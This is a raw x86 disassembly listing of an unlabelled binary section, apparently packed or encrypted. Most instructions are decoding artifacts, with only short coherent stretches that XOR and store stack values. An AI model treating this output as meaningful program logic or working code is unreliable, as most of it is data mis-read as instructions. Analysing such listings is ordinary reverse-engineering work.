  40214e:	or     dl,BYTE PTR [eax-0x75]
  402151:	inc    ebp
  402152:	call   0x40cb5c
  402157:	add    cl,ch
  402159:	pushf  
  40215a:	add    DWORD PTR [eax],eax
  40215c:	add    ch,dh
  40215e:	dec    ebx
  40215f:	and    eax,0x7570a1be
  402164:	jno    0x402191
  402166:	push   ds
  402167:	mov    ch,0x76
  402169:	and    ebp,DWORD PTR [esi+0x21e05e7]
  40216f:	jle    0x4021ef
  402171:	cli    
  402172:	jg     0x4021f2
  402174:	jle    0x402162
  402176:	fidiv  WORD PTR [eax]
  402178:	aam    0x6
  40217a:	cmp    edi,DWORD PTR [esi+0x59]
  40217d:	inc    edi
  40217e:	jp     0x402126
  402180:	pop    ds
  402181:	inc    ebx
  402182:	adc    BYTE PTR [ebx+0x63d10710],cl
  402188:	nop
  402189:	in     al,dx
  40218a:	sub    eax,0x63471b93
  40218f:	sbb    eax,0xb8a17f04
  402194:	lock sub ebp,edx
  402197:	cld    
  402198:	mov    BYTE PTR [ebx-0x3d824aa8],ch
  40219e:	in     eax,dx
  40219f:	xchg   ebx,eax
  4021a0:	or     al,BYTE PTR [ebx]
  4021a2:	(bad)  
  4021a3:	out    dx,al
  4021a4:	lea    ebp,[ebx-0x5c]
  4021a7:	sub    eax,0xa8a8cd20
  4021ac:	inc    esi
  4021ad:	push   esp
  4021ae:	mov    esp,0xccfcf325
  4021b3:	add    al,0xf5
  4021b5:	repnz repnz les esp,FWORD PTR [ecx-0x347d4cde]
  4021bd:	xchg   edx,eax
  4021be:	test   DWORD PTR [eax],esi
  4021c0:	outs   dx,BYTE PTR ds:[esi]
  4021c1:	xchg   esp,eax
  4021c2:	cmp    DWORD PTR [esi+0x4800e1e],ebx
  4021c8:	jle    0x40223d
  4021ca:	jg     0x402188
  4021cc:	mov    ecx,0x856304e1
  4021d1:	pop    ebx
  4021d2:	repnz aam 0xaa
  4021d5:	lock outs dx,BYTE PTR ds:[esi]
  4021d7:	clc    
  4021d8:	pushf  
  4021d9:	fisttp WORD PTR [edi+0x25]
  4021dc:	inc    ebx
  4021dd:	or     BYTE PTR [ecx-0x2e],0xf6
  4021e1:	adc    al,0x2d
  4021e3:	fistp  QWORD PTR [ebx+ebx*1-0x22]
  4021e7:	lods   al,BYTE PTR ds:[esi]
  4021e8:	push   edi
  4021e9:	push   esp
  4021ea:	lock or al,0xe5
  4021ed:	adc    eax,0xeedad1af
  4021f2:	fsubr  QWORD PTR [ebp-0x43b4ce4a]
  4021f8:	or     ah,BYTE PTR [edx+0x25c28ecd]
  4021fe:	sbb    DWORD PTR [ecx-0xd],0xffffffae
  402202:	dec    edx
  402203:	fwait
  402204:	mov    al,ds:0xc3f683e8
  402209:	jmp    0x17e8:0x621a6db4
  402210:	xchg   ebx,eax
  402211:	aad    0x97
  402213:	jmp    0x402273
  402215:	mov    bh,0x95
  402217:	mov    eax,0x5ed464b3
  40221c:	xchg   esi,eax
  40221d:	outs   dx,DWORD PTR ds:[esi]
  40221e:	rol    DWORD PTR [ecx+0x52],0xaa
  402222:	shl    BYTE PTR [edi+eiz*2+0x7b],0x2a
  402227:	pop    ss
  402228:	fwait
  402229:	mov    esp,0x7147fce3
  40222e:	pop    eax
  40222f:	ret    
  402230:	jecxz  0x402245
  402232:	xor    al,0xf
  402234:	stos   DWORD PTR es:[edi],eax
  402235:	aaa    
  402236:	fild   QWORD PTR [edi+0x4be2f574]
  40223c:	dec    edi
  40223d:	inc    ecx
  40223e:	jb     0x40221c
  402240:	mov    ch,0x12
  402242:	inc    esp
  402243:	das    
  402244:	sti    
  402245:	lds    ebp,FWORD PTR [esi-0x7879cbda]
  40224b:	or     al,0xd6
  40224d:	xchg   ebp,eax
  40224e:	mov    ebp,0xe0ac4573
  402253:	add    DWORD PTR [eax+0x5a],0xffffffa9
  402257:	cmp    BYTE PTR [eax-0xf],ah
  40225a:	jne    0x4021e4
  40225c:	je     0x402284
  40225e:	xchg   edi,eax
  40225f:	(bad)  
  402260:	loope  0x40224c
  402262:	cld    
  402263:	xor    eax,0x7756572d
  402268:	add    DWORD PTR [edx+0x1c],0xffffffdc
  40226c:	shl    BYTE PTR [esi+ecx*8+0x7c],0x38
  402271:	ins    BYTE PTR es:[edi],dx
  402272:	xor    al,0x9a
  402274:	std    
  402275:	cmp    eax,0xec595af5
  40227a:	mov    BYTE PTR [ebx-0xe095b36],ch
  402280:	inc    ecx
  402281:	add    BYTE PTR [esi],ah
  402283:	adc    al,0x88
  402285:	ja     0x40225b
  402287:	or     DWORD PTR [ebx-0x5ca2b5b],edx
  40228d:	(bad)
  402290:	and    BYTE PTR [ebx+0x36d1b0bb],ah
  402296:	pop    ecx
  402297:	mov    esp,0xd9bbf1bd
  40229c:	and    ebp,DWORD PTR [edx]
  40229e:	es gs xchg edx,eax
  4022a1:	mov    ebx,esi
  4022a3:	mov    esi,0xf67e2d00
  4022a8:	adc    ebx,ebx
  4022aa:	add    eax,edx
  4022ac:	and    al,0xef
  4022ae:	mov    al,BYTE PTR [esi-0x2c9b49b7]
  4022b4:	and    DWORD PTR [ebp+0x6d],0x68
  4022b8:	les    ebp,FWORD PTR [esi]
  4022ba:	icebp  
  4022bb:	std    
  4022bc:	mov    ah,0x9
  4022be:	mov    esi,0xb48280ed
  4022c3:	jne    0x402311
  4022c5:	cmp    esp,ecx
  4022c7:	(bad)  
  4022c9:	std    
  4022ca:	cwde   
  4022cb:	call   0x2d55:0xe50692b0
  4022d2:	sub    BYTE PTR [ebx+0x21c2b30],0x8e
  4022d9:	push   0xffffffc4
  4022db:	ss cmp eax,0x9360ca33
  4022e1:	or     BYTE PTR [ebp+0x1c6cbe5b],cl
  4022e7:	fstp   TBYTE PTR [ecx+0xeabd391]
  4022ed:	fwait
  4022ee:	sbb    ecx,DWORD PTR [edx-0x42]
  4022f1:	ins    BYTE PTR es:[edi],dx
  4022f2:	dec    eax
  4022f3:	sahf   
  4022f4:	push   eax
  4022f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4022f6:	sbb    bl,dl
  4022f8:	jp     0x40234a
  4022fa:	mov    eax,DWORD PTR [ebp-0x18]
  4022fd:	mov    eax,DWORD PTR [eax+0x198]
  402303:	push   DWORD PTR [eax]
  402305:	call   0x40984d
  40230a:	mov    DWORD PTR [ebp-0x4],eax
  40230d:	cmp    DWORD PTR [ebp-0x4],0x0
  402311:	lea    eax,[ebp+0x4]
  402314:	mov    DWORD PTR [ebp-0x38],eax
  402317:	je     0x40313f
  40231d:	lea    eax,[ebp-0xc]
  402320:	mov    DWORD PTR [ebp-0x30],eax
  402323:	mov    eax,DWORD PTR [ebp-0x4c]
  402326:	xor    eax,esi
  402328:	add    eax,edi
  40232a:	mov    DWORD PTR [ebp-0x34],eax
  40232d:	mov    eax,DWORD PTR [ebp-0x28]
  402330:	xor    eax,esi
  402332:	add    eax,edi
  402334:	mov    DWORD PTR [ebp-0x20],eax
  402337:	mov    eax,DWORD PTR [ebp-0x4]
  40233a:	mov    DWORD PTR [ebp-0x24],eax
  40233d:	lea    eax,[ebp-0x98]
  402343:	mov    DWORD PTR [ebp-0x8],eax
  402346:	jmp    0x4024e7
  40234b:	mov    ds:0x623e7a3a,al
  402350:	bound  esp,QWORD PTR ds:[edx-0x4a]
  402354:	fadd   DWORD PTR [ebp+0x4b]
  402357:	jnp    0x4023b9
  402359:	jmp    0x402339
  40235b:	call   0x7e7f:0xfa7e7e03
  402362:	jle    0x402351
  402364:	sub    bh,BYTE PTR [esi+0x6e]
  402367:	inc    ecx
  402368:	pop    ds
  402369:	fwait
  40236a:	rcr    BYTE PTR [eax],0xe2
  40236d:	mov    al,0x27
  40236f:	jnp    0x4023b6
  402371:	not    BYTE PTR [esi]
  402373:	mov    ah,0xa6
  402375:	sbb    esp,eax
  402377:	sub    ebp,ebp
  402379:	push   edx
  40237a:	retf   
  40237b:	aaa    
  40237c:	add    BYTE PTR gs:[ebp-0x67],ch
  402380:	mov    edx,eax
  402382:	or     BYTE PTR [ebx],bl
  402384:	dec    esi
  402385:	dec    eax
  402386:	aas    
  402387:	mov    eax,ds:0xe4077c62
  40238c:	retf   0x87b1
  40238f:	mov    ebx,0x47b30878
  402394:	lock imul bl
  402397:	inc    esi
  402398:	lahf   
  402399:	lods   al,BYTE PTR ds:[esi]
  40239a:	sub    eax,DWORD PTR ds:0x1d76aec8
  4023a0:	xchg   BYTE PTR ds:0x85cf0e69,ch
  4023a6:	mov    ah,0xe5
  4023a8:	jno    0x40232a
  4023aa:	aas    
  4023ab:	cmp    al,ch
  4023ad:	dec    esp
  4023ae:	dec    esp
  4023af:	sub    DWORD PTR [edx],edi
  4023b1:	adc    DWORD PTR [eax-0x1b],edi
  4023b4:	fstp   TBYTE PTR [esi+edx*2-0x25]
  4023b8:	sub    eax,0xa9a13b8f
  4023bd:	xchg   edi,eax
  4023be:	lods   al,BYTE PTR ds:[esi]
  4023bf:	mov    ds:0x8a15aec4,al
  4023c4:	pop    ds
  4023c5:	cmp    BYTE PTR [ebp+0x4c545898],0x70
  4023cc:	xor    eax,0xe05e85ed
  4023d1:	out    0xea,al
  4023d3:	dec    edx
  4023d4:	stos   BYTE PTR es:[edi],al
  4023d5:	add    eax,0x652f2419
  4023da:	and    al,0xb3
  4023dc:	cmp    bl,bh
  4023de:	test   eax,0x1e81d15d
  4023e3:	ret    0x18bf
  4023e6:	sub    bh,cl
  4023e8:	scas   al,BYTE PTR es:[edi]
  4023e9:	pop    edx
  4023ea:	xchg   edx,eax
  4023eb:	ins    BYTE PTR es:[edi],dx
  4023ec:	pop    ebx
  4023ed:	xor    BYTE PTR [eax],dl
  4023ef:	or     al,0x82
  4023f1:	xchg   edx,eax
  4023f2:	lods   al,BYTE PTR fs:[esi]
  4023f4:	shl    ebx,0xcd
  4023f7:	in     al,dx
  4023f8:	adc    dh,BYTE PTR [edi-0x5b6740ad]
  4023fe:	ret    
  4023ff:	lods   al,BYTE PTR ds:[esi]
  402400:	iret   
  402401:	fdivr  QWORD PTR [eax+eax*1+0x74]
  402405:	call   0xcec63638
  40240a:	dec    edx
  40240b:	or     bl,0x7d
  40240e:	das    
  40240f:	mov    edi,0x38dac4b9
  402414:	push   ecx
  402415:	mov    bl,0x85
  402417:	sbb    al,0x55
  402419:	loopne 0x402498
  40241b:	pusha  
  40241c:	xchg   dl,bl
  40241e:	int    0xf7
  402420:	call   0x91f1dace
  402425:	in     al,dx
  402426:	(bad)  
  402427:	sub    ch,dl
  402429:	add    eax,DWORD PTR [esi+0x13223f7c]
  40242f:	pop    ss
  402430:	ins    DWORD PTR es:[edi],dx
  402431:	rcr    DWORD PTR [ebx],0xc3
  402434:	pop    ss
  402435:	cli    
  402436:	int3   
  402437:	push   ebp
  402438:	jmp    0x6d130c29
  40243d:	sbb    ch,BYTE PTR [eax-0x36]
  402440:	and    ebx,esp
  402442:	jg     0x40247b
  402444:	or     ch,BYTE PTR [esi]
  402446:	es (bad) 
  402448:	in     eax,dx
  402449:	and    eax,0x409fcca4
  40244e:	sbb    BYTE PTR [ebx-0x6d2eaecc],ch
  402454:	dec    ebp
  402455:	gs ret 
  402457:	lds    ebp,FWORD PTR [ebp-0x5e14669]
  40245d:	mov    esp,0xcb07396c
  402462:	gs cmp eax,esi
  402465:	jo     0x402452
  402467:	test   DWORD PTR [ebx],edx
  402469:	pop    ebp
  40246a:	imul   ebp,DWORD PTR [eax+0x1633ffd7],0xffffff91
  402471:	jbe    0x4024c4
  402473:	mov    edx,0x1d88349d
  402478:	ins    WORD PTR es:[edi],dx
  40247a:	mov    eax,0x6376aeaf
  40247f:	mov    WORD PTR [ebp+0x389c5135],fs
  402485:	cld    
  402486:	jl     0x4024df
  402488:	aad    0x63
  40248a:	mov    dl,BYTE PTR [edx-0x10]
  40248d:	loopne 0x402438
  40248f:	mov    ds:0x93c61b29,al
  402494:	out    dx,eax
  402495:	aad    0xb6
  402497:	pop    edi
  402498:	call   0xbd7ac411
  40249d:	and    eax,0x26b12310
  4024a2:	leave  
  4024a3:	add    al,0x1f
  4024a5:	xor    esi,DWORD PTR [ecx+0x66ab0e6]
  4024ab:	ret    
  4024ac:	loope  0x4024d1
  4024ae:	arpl   WORD PTR [eax],cx
  4024b0:	int    0xf
  4024b2:	bound  esp,QWORD PTR [ecx+0x51]
  4024b5:	retf   
  4024b6:	in     eax,0x15
  4024b8:	jae    0x402463
  4024ba:	int    0x87
  4024bc:	into   
  4024bd:	adc    al,0x12
  4024c0:	xchg   ebx,eax
  4024c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4024c2:	and    al,0xb
  4024c4:	and    edx,DWORD PTR [edx]
  4024c6:	dec    ecx
  4024c7:	aaa    
  4024c8:	icebp  
  4024c9:	cld    
  4024ca:	stc    
  4024cb:	aad    0xc0
  4024cd:	sub    BYTE PTR [eax+edx*1],dh
  4024d0:	ret    0x3d32
  4024d3:	push   ss
  4024d4:	into   
  4024d5:	xchg   ebx,eax
  4024d6:	loope  0x4024b1
  4024d8:	pop    eax
  4024d9:	shr    BYTE PTR [ebp+eiz*2+0x5813d454],0xb3
  4024e1:	adc    bh,ch
  4024e3:	adc    cl,BYTE PTR [esi+0x458be3ce]
  4024e9:	lock mov DWORD PTR [ebp-0x10],eax
  4024ed:	mov    eax,DWORD PTR [ebp-0x1c]
  4024f0:	mov    DWORD PTR [ebp-0x40],ebx
  4024f3:	mov    DWORD PTR [ebp-0x2c],eax
  4024f6:	mov    eax,DWORD PTR [ebp-0x40]
  4024f9:	mov    ecx,DWORD PTR [ebp-0x8]
  4024fc:	jmp    0x40269d
  402501:	push   ebp
  402502:	shl    BYTE PTR [ebp+0x7159b138],1
  402508:	push   ecx
  402509:	stos   DWORD PTR es:[edi],eax
  40250a:	rol    eax,0x47
  40250d:	xor    bl,al
  40250f:	push   esp
  402510:	and    DWORD PTR [esi],esp
  402512:	add    DWORD PTR [esi+0x7e],edi
  402515:	cli    
  402516:	jg     0x402596
  402518:	jle    0x40253d
  40251a:	mov    bh,0x11
  40251c:	push   0xb62d62dc
  402521:	out    dx,al
  402522:	pop    ebx
  402523:	aaa    
  402524:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402525:	call   0x7afa4771
  40252a:	mov    ebp,0xcb599014
  40252f:	xchg   DWORD PTR [esi-0x5c9ba368],edx
  402535:	lahf   
  402536:	push   ss
  402537:	push   esp
  402538:	or     ch,BYTE PTR [edx+0x4c7ce65a]
  40253e:	lods   al,BYTE PTR ds:[esi]
  40253f:	popf   
  402540:	add    BYTE PTR [bx],ch
  402543:	fs pop esp
  402545:	rcr    DWORD PTR [eax+0xdb3357b],cl
  40254b:	test   ah,al
  40254d:	ds stos BYTE PTR es:[edi],al
  40254f:	xor    eax,DWORD PTR [edx-0x42aa0323]
  402555:	retf   0x1802
  402558:	inc    esi
  402559:	pop    edi
  40255a:	jmp    0xd6e5417e
  40255f:	les    ebp,FWORD PTR [edx-0x6e82bb9c]
  402565:	xchg   ebp,eax
  402566:	push   ebp
  402567:	sub    DWORD PTR [eax],edi
  402569:	adc    edx,DWORD PTR [ebp-0x58275fa6]
  40256f:	in     al,dx
  402570:	stc    
  402571:	xchg   esp,eax
  402572:	xchg   ecx,eax
  402573:	es (bad) 
  402576:	push   es
  402577:	xchg   edx,eax
  402578:	push   0x71
  40257a:	mov    bl,0x84
  40257c:	xchg   ebp,eax
  40257d:	adc    DWORD PTR [edi-0x2c],edx
  402580:	into   
  402581:	jmp    0xea5f86e9
  402586:	into   
  402587:	lods   eax,DWORD PTR ds:[esi]
  402588:	lahf   
  402589:	lods   al,BYTE PTR ds:[esi]
  40258a:	repz (bad) 
  40258c:	sbb    BYTE PTR [eax+0x29074177],dl
  402592:	enter  0xd894,0xe5
  402596:	or     BYTE PTR [ecx],0x3
  402599:	pop    esp
  40259a:	(bad)
  40259d:	arpl   cx,si
  40259f:	mov    cs,WORD PTR [edx]
  4025a1:	jecxz  0x4025de
  4025a3:	pop    esi
  4025a4:	fwait
  4025a5:	add    BYTE PTR [esi],bl
  4025a7:	pop    ebp
  4025a8:	repz fisttp WORD PTR [esi+0x4d0d5fa9]
  4025af:	sub    BYTE PTR gs:[ecx],bl
  4025b2:	aas    
  4025b3:	test   DWORD PTR [ecx],ecx
  4025b5:	ins    DWORD PTR es:[edi],dx
  4025b6:	pop    ebx
  4025b7:	push   cs
  4025b8:	(bad)  
  4025b9:	je     0x40255b
  4025bb:	mov    dh,BYTE PTR [esi+0x51f1bff]
  4025c1:	lods   al,BYTE PTR ds:[esi]
  4025c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4025c3:	jae    0x40259a
  4025c5:	xchg   BYTE PTR [ebp+0x7e60678b],al
  4025cb:	inc    ebp
  4025cc:	call   0x6d406a28
  4025d1:	dec    eax
  4025d2:	mov    eax,0x30e2febe
  4025d7:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  4025d9:	jbe    0x402614
  4025db:	dec    edi
  4025dc:	daa    
  4025dd:	lahf   
  4025de:	call   0xee3bffd0
  4025e3:	xchg   edx,eax
  4025e4:	rcl    dl,cl
  4025e6:	xor    BYTE PTR [ecx+0x3a],dh
  4025e9:	or     al,0x8f
  4025eb:	leave  
  4025ec:	cmp    DWORD PTR [eax+0x4f9829c2],ebx
  4025f2:	sub    ah,al
  4025f4:	and    ah,BYTE PTR [ebx+edx*4+0x2ef4be59]
  4025fb:	sti    
  4025fc:	fwait
  4025fd:	or     ebx,DWORD PTR [esi]
  4025ff:	hlt    
  402600:	and    eax,0xa166110
  402605:	scas   al,BYTE PTR es:[edi]
  402606:	repz out 0xc5,al
  402609:	xor    al,0xf8
  40260b:	scas   al,BYTE PTR es:[edi]
  40260c:	sbb    BYTE PTR [edi],ah
  40260e:	int    0x4
  402610:	outs   dx,DWORD PTR ds:[esi]
  402611:	lods   al,BYTE PTR ds:[esi]
  402612:	cmp    edx,esi
  402614:	enter  0xcf65,0x11
  402618:	mov    esp,DWORD PTR [ebx-0x18]
  40261b:	push   esp
  40261c:	jg     0x402630
  40261e:	jnp    0x402622
  402620:	pop    ebp
  402621:	test   DWORD PTR [esp+eax*1],edi
  402624:	fcmovnu st,st(0)
  402626:	mov    dh,0x72
  402628:	jne    0x4025ab
  40262a:	cld    
  40262b:	mov    ds:0x913cb88b,eax
  402630:	pop    edx
  402631:	dec    ecx
  402632:	test   DWORD PTR [eax+0x3],edi
  402635:	dec    edi
  402636:	pop    ss
  402637:	aas    
  402638:	push   ecx
  402639:	enter  0x8768,0xeb
  40263d:	jbe    0x40264d
  40263f:	sbb    dl,BYTE PTR [ecx+0x57]
  402642:	icebp  
  402643:	pop    edi
  402644:	cmp    al,0xe
  402646:	xchg   ecx,eax
  402647:	sbb    ah,dl
  402649:	mov    cs,WORD PTR [ebp+0x4e477f52]
  40264f:	(bad)  
  402650:	pop    ecx
  402651:	xor    esi,DWORD PTR [ebx-0x7b14875c]
  402657:	dec    edi
  402658:	mov    edi,0x24fee383
  40265d:	ret    
  40265e:	jge    0x4025ee
  402660:	scas   eax,DWORD PTR es:[edi]
  402661:	fist   DWORD PTR ds:0x5790008d
  402667:	push   ss
  402668:	in     eax,dx
  402669:	add    esp,DWORD PTR ds:0xabf9cf37
  40266f:	mov    dh,0xd4
  402671:	sbb    ebp,eax
  402673:	(bad)  
  402675:	add    dh,BYTE PTR [ebp+0x16]
  402678:	cmp    esp,edx
  40267a:	test   eax,0xd152ebbc
  40267f:	cs xor eax,0xccd2e8b2
  402685:	and    ch,BYTE PTR [ecx-0x10]
  402688:	adc    esp,DWORD PTR [ecx-0x22]
  40268b:	sub    DWORD PTR [edi-0x68],esi
  40268e:	or     edi,DWORD PTR [eax+ebp*1-0x61621b39]
  402695:	xchg   esp,eax
  402696:	out    0xef,al
  402698:	jmp    0xceeb7117
  40269d:	xor    eax,esi
  40269f:	add    eax,0x32729b
  4026a4:	mov    DWORD PTR [ecx],eax
  4026a6:	mov    eax,DWORD PTR [ebp-0x24]
  4026a9:	mov    ecx,DWORD PTR [ebp-0x8]
  4026ac:	mov    DWORD PTR [ecx+0x4],eax
  4026af:	mov    eax,DWORD PTR [ebp-0x20]
  4026b2:	mov    ecx,DWORD PTR [ebp-0x8]
  4026b5:	mov    DWORD PTR [ecx+0x8],eax
  4026b8:	mov    eax,DWORD PTR [ebp-0x34]
  4026bb:	mov    ecx,DWORD PTR [ebp-0x8]
  4026be:	mov    DWORD PTR [ecx+0xc],eax
  4026c1:	jmp    0x402862
  4026c6:	les    ecx,FWORD PTR [eax+0x5552d502]
  4026cc:	ror    DWORD PTR [ecx-0x7d59e5d1],1
  4026d2:	push   ds
  4026d3:	fptan  
  4026d5:	push   0xffffffa2
  4026d7:	push   cs
  4026d8:	jle    0x402758
  4026da:	cli    
  4026db:	jg     0x40275b
  4026dd:	jle    0x40269f
  4026df:	push   eax
  4026e0:	(bad)  
  4026e1:	jb     0x40272a
  4026e3:	call   0x5f9ed0c4
  4026e8:	mov    ds:0x9b73e16d,eax
  4026ed:	or     eax,0x57716dc3
  4026f2:	mov    esp,0xce4fffe9
  4026f7:	xchg   edi,eax
  4026f8:	jmp    0x4026de
  4026fa:	(bad)
  4026fe:	repnz xor BYTE PTR [ecx+0x58b17a27],bh
  402705:	lahf   
  402706:	fs jmp 0x7d8cd643
  40270c:	jmp    0x542d:0x3f0b12b2
  402713:	pushf  
  402714:	ss dec ebp
  402716:	or     ebp,edx
  402718:	jge    0x402740
  40271a:	idiv   DWORD PTR [edi*1-0x2b3bd7c0]
  402721:	pop    ebp
  402722:	pop    ebx
  402723:	pushf  
  402724:	jl     0x402796
  402726:	xor    eax,0x49402224
  40272b:	shr    BYTE PTR [ecx+0x5a15ad49],cl
  402731:	push   0x31c8c8b1
  402736:	or     eax,0xbf69efd0
  40273b:	daa    
  40273c:	mov    bl,0x69
  40273e:	push   ss
  40273f:	and    ah,BYTE PTR [eax]
  402741:	lahf   
  402742:	pop    ds
  402743:	clc    
  402744:	stos   BYTE PTR es:[edi],al
  402745:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402746:	jb     0x402749
  402748:	rol    BYTE PTR ds:0xad5b1eb6,1
  40274e:	inc    ebx
  40274f:	iret   
  402750:	repz or ebx,ecx
  402753:	data16 mov cl,0x1e
  402756:	(bad)  
  402757:	mov    esi,fs
  402759:	out    dx,eax
  40275a:	outs   dx,DWORD PTR ds:[esi]
  40275b:	inc    ebx
  40275c:	rol    BYTE PTR [edi-0x3e],0x14
  402760:	inc    ecx
  402761:	sub    BYTE PTR [ebp-0x401e6d06],cl
  402767:	adc    eax,0x55f2fcea
  40276c:	cli    
  40276d:	jb     0x402771
  40276f:	mov    eax,ds:0xabead476
  402775:	jp     0x40271f
  402777:	idiv   BYTE PTR [ebx-0x25d1637]
  40277d:	ds sub al,0x9b
  402780:	ret    
  402781:	sub    al,0x95
  402783:	es and al,0x1e
  402786:	out    dx,al
  402787:	mov    edx,DWORD PTR [ebp+0x1b]
  40278a:	inc    eax
  40278b:	push   edx
  40278c:	mov    esp,0xd368ed36
  402791:	push   esp
  402792:	mov    ds:0x677146f2,al
  402797:	xchg   BYTE PTR [edi+0x2750e4ae],bl
  40279d:	xor    al,0x76
  40279f:	call   0xc98e9359
  4027a4:	mov    bh,0xfe
  4027a6:	cli    
  4027a7:	xchg   esp,eax
  4027a8:	hlt    
  4027a9:	add    eax,0x127fd20
  4027ae:	ins    DWORD PTR es:[edi],dx
  4027af:	les    edi,FWORD PTR [edx+0x4139233]
  4027b5:	or     dl,BYTE PTR [eax-0x79a22029]
  4027bb:	in     eax,0x9b
  4027bd:	shr    BYTE PTR [ebx+0x79],cl
  4027c0:	xor    al,0x83
  4027c2:	or     edi,eax
  4027c4:	aam    0xc7
  4027c6:	les    edx,FWORD PTR [esi-0x397db6bc]
  4027cc:	rcl    DWORD PTR [ebx+0x6f],cl
  4027cf:	fisttp DWORD PTR [edx-0x3abfc216]
  4027d5:	add    ebx,0xfffffffb
  4027d8:	mov    ebx,0xb17a7f95
  4027dd:	jmp    DWORD PTR [ecx]
  4027df:	push   edx
  4027e0:	jmp    0x402857
  4027e2:	and    ecx,DWORD PTR [eax-0x4f]
  4027e5:	sub    ch,al
  4027e7:	add    DWORD PTR [edx+0x1af7d643],esp
  4027ed:	fisttp WORD PTR [ebp+0x3acd7a2f]
  4027f3:	aas    
  4027f4:	es and al,0xf9
  4027f7:	jae    0x4027e9
  4027f9:	(bad)  
  4027fa:	push   0x50072e17
  4027ff:	mov    bh,0x35
  402801:	mov    esp,0x42327a34
  402806:	mov    ds:0x98eb6583,eax
  40280b:	pop    es
  40280c:	dec    ebx
  40280d:	xchg   BYTE PTR [ebx-0x25],cl
  402810:	data16 add al,0x7c
  402813:	inc    eax
  402814:	(bad)  
  402815:	clc    
  402816:	fnsave [edi+0x1f]
  402819:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40281a:	test   eax,0x93841623
  40281f:	pop    esp
  402820:	daa    
  402821:	jbe    0x40285c
  402823:	mov    ah,0xac
  402825:	mov    cl,0xb7
  402827:	and    ebp,DWORD PTR [ebx-0x64]
  40282a:	sub    cl,BYTE PTR ds:0x27c4799a
  402830:	sar    cl,1
  402832:	push   esp
  402833:	adc    DWORD PTR [ecx-0x30a4321d],ebx
  402839:	inc    esp
  40283a:	ror    DWORD PTR [esi+0x344ade5a],cl
  402840:	xor    DWORD PTR [eax],0xffffff9e
  402843:	in     eax,0xff
  402845:	push   cs
  402846:	(bad)  
  402847:	into   
  402848:	(bad)  
  402849:	call   FWORD PTR [esi]
  40284b:	cmp    DWORD PTR [ebx-0x28],esi
  40284e:	test   DWORD PTR [edx+ecx*2-0x20],ecx
  402852:	shl    BYTE PTR [esi-0x5d],cl
  402855:	adc    BYTE PTR [ecx],bh
  402857:	sub    DWORD PTR [esi+0x781e63e9],ecx
  40285d:	push   ebx
  40285e:	ror    BYTE PTR [ecx+0x458b72ec],cl
  402864:	ror    BYTE PTR [ebx+0x4189f84d],1
  40286a:	adc    BYTE PTR [ebx-0x23ba7440],cl
  402870:	test   eax,eax
  402872:	jmp    0x402a13
  402877:	inc    edi
  402878:	push   eax
  402879:	jnp    0x402883
  40287b:	or     DWORD PTR [ecx+0x55],edx
  40287e:	push   ecx
  40287f:	adc    BYTE PTR [ebx],ch
  402881:	nop
  402882:	dec    esp
  402883:	add    ecx,ebp
  402885:	or     al,0x48
  402887:	cs or  al,0x7e
  40288a:	jle    0x402886
  40288c:	jg     0x40290c
  40288e:	jle    0x402848
  402890:	adc    ecx,esi
  402892:	ja     0x4028d0
  402894:	add    edi,DWORD PTR [ecx+0x6b0390d4]
  40289a:	add    ecx,ecx
  40289c:	adc    dh,BYTE PTR [esi+0x4b]
  40289f:	pop    edi
  4028a0:	sbb    ch,BYTE PTR [edi+0x68255777]
  4028a6:	push   edx
  4028a7:	pop    ds
  4028a8:	scas   al,BYTE PTR es:[edi]
  4028a9:	add    al,0x53
  4028ab:	push   ecx
  4028ac:	mov    eax,ds:0xf2936392
  4028b1:	cmp    al,0xa0
  4028b3:	daa    
  4028b4:	sbb    ch,BYTE PTR [esi-0x2f]
  4028b7:	sar    DWORD PTR [esi+0x4a],1
  4028ba:	sahf   
  4028bb:	in     al,dx
  4028bc:	nop
  4028bd:	outs   dx,BYTE PTR ds:[esi]
  4028be:	fdivrp st(7),st
  4028c0:	dec    ecx
  4028c1:	sbb    BYTE PTR [ebp-0x426293f7],bh
  4028c7:	xor    esp,DWORD PTR [ebp+0x62ed73c9]
  4028cd:	aas    
  4028ce:	cdq    
  4028cf:	add    BYTE PTR [edx],dh
  4028d1:	mov    esp,0xd3ac1d3b
  4028d6:	addr16 es or edi,ebp
  4028da:	jmp    0x6944b02c
  4028df:	mov    bl,0xb4
  4028e1:	je     0x40295d
  4028e3:	fadd   DWORD PTR [eax+0x6ed304fa]
  4028e9:	ins    BYTE PTR es:[edi],dx
  4028ea:	pop    ebx
  4028eb:	int    0xf0
  4028ed:	lahf   
  4028ee:	dec    ebp
  4028ef:	sahf   
  4028f0:	mov    esi,esp
  4028f2:	push   esp
  4028f3:	mov    bl,0xa2
  4028f5:	test   eax,0xa46ae066
  4028fa:	retf   
  4028fb:	or     bh,0x72
  4028fe:	stos   BYTE PTR es:[edi],al
  4028ff:	in     al,dx
  402900:	sub    edx,DWORD PTR [ebp-0x42]
  402903:	or     edi,DWORD PTR [esi+0x6a]
  402906:	xchg   ebx,eax
  402907:	fidivr WORD PTR [eax+0x346604fb]
  40290d:	sbb    al,0xb1
  40290f:	sub    DWORD PTR [eax],0xe58cdb31
  402915:	loope  0x4028bc
  402917:	into   
  402918:	pop    esi
  402919:	xchg   esi,eax
  40291a:	inc    esi
  40291b:	lds    esi,FWORD PTR [esi+0x33645dc6]
  402921:	jecxz  0x402999
  402923:	push   ds
  402924:	xchg   edx,eax
  402925:	call   0xb297:0xa5562c78
  40292c:	clc    
  40292d:	stc    
  40292e:	shl    DWORD PTR [ecx-0xeb2f712],1
  402934:	sbb    ebp,DWORD PTR [esi+0xb29b42e]
  40293a:	sar    DWORD PTR [ebx-0x7],1
  40293d:	sti    
  40293e:	mov    edi,0x8256d2a9
  402943:	jmp    0x402936
  402945:	mov    ecx,0x2ee7df83
  40294a:	ror    DWORD PTR [ebp-0x446fd770],1
  402950:	adc    esp,DWORD PTR [ebx+0x6b9f0945]
  402956:	add    ch,ah
  402958:	xlat   BYTE PTR ds:[ebx]
  402959:	popa   
  40295a:	pop    ss
  40295b:	popf   
  40295c:	repz (bad) 
  40295e:	jnp    0x402927
  402960:	push   0xd3bec3a5
  402965:	jmp    0x402993
  402967:	(bad)  
  402968:	mov    dl,0x2e
